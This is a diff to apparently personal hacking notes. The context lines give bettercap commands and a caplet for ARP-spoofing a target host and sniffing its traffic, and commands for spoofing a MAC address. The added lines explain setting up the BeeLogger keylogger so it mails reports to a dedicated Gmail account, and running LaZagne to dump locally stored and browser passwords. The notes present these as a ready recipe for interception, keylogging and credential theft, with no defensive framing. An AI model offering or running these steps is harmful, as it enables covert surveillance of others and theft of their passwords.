@@ -24,8 +24,8 @@ set arp.spoof.targets 10.0.2.4  --> Adding the target to monitor.
 arp.spoof on    --> enable the spoof service  
 set net.sniff.local true  --> If true, will consider packets from/to computer as local.  
 net.sniff on    --> enable the sniffing service  
-  
-  
+
+
 vim sniff.cap  
 ----------------------------  
 net probe on  
@@ -36,9 +36,20 @@ arp.spoof on
 net.sniff on  
 ----------------------------  
 bettercap -iface eth0 -caplet sniff.cap  --> will do manual job as auto.  
-  
+
 ### To change MAC Address of your adapter do next:  
 ifconfig wlan0 down  
 ifconfig wlan0 hw ether 00:11:22:33:44:55  
 ifconfig wlan0 up  
+
+### Create a logger with reports to be sent to your dedicated Gmail
+git clone https://github.com/4w4k3/BeeLogger.git
+install on your kali-linux
+create a new dedicated Gmail account with this enabled https://www.google.com/settings/security/lesssecureapps
+
+### Retrieve locally stored passwords on your host with LaZagne
+git clone https://github.com/AlessandroZ/LaZagne.git
+pip install -r requirements.txt
+laZagne.exe all       (Launch all modules)
+LaZagne.exe browsers  (will show you found local passwords)
 
